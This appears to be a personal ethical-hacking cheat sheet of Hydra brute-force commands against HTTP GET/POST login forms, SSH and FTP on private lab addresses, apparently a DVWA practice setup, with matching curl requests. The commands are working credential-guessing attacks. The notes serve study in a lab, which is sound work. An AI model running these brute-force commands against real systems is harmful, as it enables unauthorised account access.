# EH-Notes

## Brute Force
### Hydra
#### HTTP Attacks
##### GET Form
`hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://192.168.57.132/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low:F=Username and/or password incorrect'`


`curl 'http://192.168.57.132/vulnerabilities/brute/?username=admin&password=admin&Login=Login#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/vulnerabilities/brute/' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1'`

##### POST Form

`hydra -l admin -P /usr/share/wordlists/john.lst http-post-form://192.168.57.132/login.php:"username=^USER^&password=^PASS^&Login=Login":"Login failed"`

`curl 'http://192.168.57.132/login.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.57.132' -H 'Connection: keep-alive' -H 'Referer: http://192.168.57.132/login.php' -H 'Cookie: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin&password=admin&Login=Login'`

##### SSH 
`hydra -l root -P /home/kali/tools/pass.txt 192.168.57.131 ssh -t 4`

##### FTP
`hydra -t 3 -V -ensr -l root -P /usr/share/wordlists/john.lst 192.168.57.132 ftp`

## Login
### FTP

`ftp IP`

`user`

`password`


